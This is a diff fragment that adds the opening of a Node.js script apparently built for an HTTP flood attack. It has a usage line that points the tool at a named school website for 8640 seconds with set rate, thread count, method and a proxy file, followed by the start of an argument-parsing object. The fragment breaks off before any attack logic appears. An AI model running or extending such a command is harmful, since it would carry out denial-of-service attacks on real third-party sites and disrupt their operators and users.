@@ -1,0 +1,9 @@
+node l.js https://sams.act.edu.ph/ 8640 64 100 GET http.txt
+
+const args = {
+    target: process.argv[2],
+    time: ~~process.argv[3],
+    Rate: ~~process.argv[4],
+    threads: ~~process.argv[5],
+    method: ~~process.argv[6],
+    proxyFile: process.argv[7]
